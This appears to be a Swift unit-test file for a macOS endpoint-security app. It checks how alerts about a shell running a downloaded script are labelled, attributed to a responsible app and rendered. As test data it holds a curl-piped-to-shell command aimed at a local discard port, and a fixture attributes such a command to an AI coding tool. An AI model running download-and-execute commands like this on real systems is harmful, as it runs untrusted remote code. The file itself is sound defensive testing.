import XCTest
import AppKit
import SwiftUI
@testable import Nick

final class BehaviorIncidentPresentationTests: XCTestCase {
    func test_responsibleAppMetadataDoesNotChangeTierSeverityOrTrustEligibility() {
        let baseline = behaviorAlert(metadata: baseMetadata)
        var attributedMetadata = baseMetadata
        attributedMetadata.merge([
            "responsibleAppName": "Trusted App",
            "responsibleAppBundleID": "example.trusted",
            "responsibleAppTeamID": "TRUSTEDTEAM",
            "responsibleAppSigning": "Signed",
            "responsibleAppPath": "/Applications/Trusted.app",
            "responsibleChain": "Trusted App → zsh"
        ]) { _, new in new }
        let attributed = behaviorAlert(metadata: attributedMetadata)

        XCTAssertEqual(baseline.severity, attributed.severity)
        XCTAssertEqual(tier(of: baseline), tier(of: attributed))
        XCTAssertEqual(
            TrustedProcessList.eligibleProcess(in: baseline),
            TrustedProcessList.eligibleProcess(in: attributed)
        )
    }

    func test_protectedUnblockedBehaviorUsesNeedsReviewInListAndDetail() throws {
        let alert = behaviorAlert(metadata: baseMetadata)
        let presentation = BehaviorIncidentPresentation(alert: alert)
        let user = UserFacingAlertBuilder.shared.build(from: alert)
        let detail = SimpleAlertCopy.make(
            alert: alert, user: user, isQuarantined: false, fileStillPresent: false
        )
        let input = try XCTUnwrap(SimpleActivityFeed.alertInputs(
            from: [alert], actionable: [alert.id]
        ).first)
        let row = try XCTUnwrap(SimpleActivityFeed.items(
            alerts: [input], quarantine: [], blocked: []
        ).first)

        XCTAssertEqual(presentation.status, .needsReview)
        XCTAssertEqual(detail.status.rawValue, presentation.status.rawValue)
        XCTAssertEqual(row.status.rawValue, presentation.status.rawValue)
        XCTAssertFalse(detail.subline.contains("no longer on your Mac"))
        XCTAssertTrue(detail.subline.contains("command has finished"))
    }

    func test_ended1152IncidentHasOneNeedsReviewStatusAndFiveViewHeadlineParity() throws {
        let alert = behaviorAlert(metadata: baseMetadata).withOccurrenceCount(1)
        let incident = SecurityIncident(
            key: "curl_pipe_shell|/bin/zsh|11:52",
            alert: alert,
            evidence: [],
            state: .new
        )
        let presentation = BehaviorIncidentPresentation(alert: alert, incident: incident)
        let user = UserFacingAlertBuilder.shared.build(from: alert)
        let detail = SimpleAlertCopy.make(
            alert: alert,
            user: user,
            isQuarantined: false,
            fileStillPresent: false,
            incident: incident
        )
        let input = try XCTUnwrap(SimpleActivityFeed.alertInputs(
            from: [alert], actionable: [alert.id], incidents: [incident]
        ).first)
        let row = try XCTUnwrap(SimpleActivityFeed.items(
            alerts: [input], quarantine: [], blocked: []
        ).first)

        XCTAssertEqual(alert.evidenceState(processIsRunning: { _ in false }), .processEnded)
        XCTAssertEqual(presentation.status, .needsReview)
        XCTAssertEqual(detail.status, .needsReview)
        XCTAssertEqual(row.status.rawValue, IncidentDisplayStatus.needsReview.rawValue)

        let status = ProtectionStatus.evaluate(
            actionableAlerts: [], incidents: [incident], auditIssueCount: 0, sensorRunning: true
        )
        let models: [any ProtectionStatusPresenting] = [
            SimpleHomeProtectionStatusModel(status: status),
            SimpleActivityProtectionStatusModel(status: status),
            AdvancedOverviewProtectionStatusModel(status: status),
            SmartScanProtectionStatusModel(status: status),
            SystemAuditProtectionStatusModel(status: status),
        ]
        XCTAssertTrue(models.allSatisfy {
            $0.presentation.displayText == "Attention needed · 1 item needs review"
        })
    }

    func test_behaviorTechnicalPresentationShowsAttributionActorAndMatchedCommand() {
        var metadata = baseMetadata
        metadata.merge([
            "responsibleAppName": "ChatGPT",
            "responsibleAppBundleID": "com.openai.chat",
            "responsibleAppTeamID": "2DC432GLL2",
            "responsibleAppSigning": "Signed",
            "responsibleAppPath": "/Applications/ChatGPT.app",
            "responsibleChain": "ChatGPT → Codex CLI → zsh",
            "matchedCommand": "zsh -c curl -s http://127.0.0.1:9/ | sh"
        ]) { _, new in new }

        let presentation = BehaviorIncidentPresentation(alert: behaviorAlert(metadata: metadata))

        XCTAssertEqual(presentation.responsibleLine, "ChatGPT ran this · via Codex CLI → zsh")
        XCTAssertEqual(presentation.actor, "zsh")
        XCTAssertEqual(presentation.actorSigning, "Apple platform")
        XCTAssertEqual(presentation.matchedCommand, "zsh -c curl -s http://127.0.0.1:9/ | sh")
    }

    @MainActor
    func test_attributionAndTechnicalDetailsRenderInLightAndDarkModes() throws {
        var metadata = baseMetadata
        metadata.merge([
            "responsibleAppName": "ChatGPT",
            "responsibleAppBundleID": "com.openai.chat",
            "responsibleAppTeamID": "2DC432GLL2",
            "responsibleAppSigning": "Signed",
            "responsibleAppPath": "/Applications/ChatGPT.app",
            "responsibleChain": "ChatGPT → Codex CLI → zsh",
            "matchedCommand": "zsh -c curl -s http://127.0.0.1:9/ | sh"
        ]) { _, new in new }
        let alert = behaviorAlert(metadata: metadata)
        let presentation = BehaviorIncidentPresentation(alert: alert)
        let view = VStack(alignment: .leading, spacing: 18) {
            Text(alert.title).font(.title2.bold())
            ResponsibleAppLine(presentation: presentation)
            AlertTechnicalDetails(alert: alert)
        }
        .padding(28)
        .frame(width: 720, alignment: .leading)
        .background(Color.nickCard)

        try render(view, scheme: .light, name: "Nick-5047-attribution-light.png")
        try render(view, scheme: .dark, name: "Nick-5047-attribution-dark.png")
    }

    private var baseMetadata: [String: String] {
        ["class": "behavior", "detectionKind": "lolbin-behavior", "rule": "curl_pipe_shell"]
    }

    private func behaviorAlert(metadata: [String: String]) -> ThreatAlert {
        let process = NickProcessInfo(
            pid: 42, path: "/bin/zsh", name: "zsh", parentPID: 41,
            parentName: "CodexCLI",
            signingStatus: .signed(teamID: "APPLE_PLATFORM", signingID: "com.apple.zsh")
        )
        let signal = ThreatSignal(
            source: .endpointSecurity, severity: .critical,
            title: "Download-to-shell command detected",
            description: "Nick saw a shell run a downloaded script.",
            context: ThreatSignalContext(processInfo: process, metadata: metadata)
        )
        return ThreatAlert(
            score: 0.9,
            content: AlertContent(
                title: signal.title, description: signal.description,
                severity: .critical, recommendedAction: "Review the command."
            ),
            contributingSignals: [signal]
        )
    }

    private func tier(of alert: ThreatAlert) -> EvidenceRuleTier {
        let signal = alert.contributingSignals[0]
        return EvidenceRulePolicy.tier(for: signal, ruleClass: EvidenceRuleClass(signal: signal))
    }

    @MainActor
    private func render<V: View>(_ view: V, scheme: ColorScheme, name: String) throws {
        let renderer = ImageRenderer(content: view.environment(\.colorScheme, scheme))
        renderer.scale = 2
        let image = try XCTUnwrap(renderer.nsImage)
        let representation = try XCTUnwrap(image.tiffRepresentation.flatMap(NSBitmapImageRep.init))
        let png = try XCTUnwrap(representation.representation(using: .png, properties: [:]))
        let url = URL(fileURLWithPath: "/private/tmp").appendingPathComponent(name)
        try png.write(to: url, options: .atomic)
        XCTAssertGreaterThan(png.count, 1_000)
    }
}
